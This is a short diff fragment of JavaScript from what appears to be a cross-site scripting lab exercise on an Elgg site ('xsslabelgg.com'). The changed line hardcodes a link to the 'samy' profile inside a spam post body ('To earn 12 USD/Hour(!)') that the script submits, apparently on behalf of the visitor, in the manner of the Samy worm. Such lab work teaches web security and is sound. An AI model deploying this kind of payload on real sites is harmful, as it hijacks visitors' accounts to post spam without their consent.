@@ -16,7 +16,7 @@
 
         
         var postdata = 'To earn 12 USD/Hour(!), visit now \n';
-        var linkk = 'http://www.xsslabelgg.com/profile/'+namee;
+        var linkk = 'http://www.xsslabelgg.com/profile/samy' //+namee;
 
         data.append('body', postdata+linkk);
        
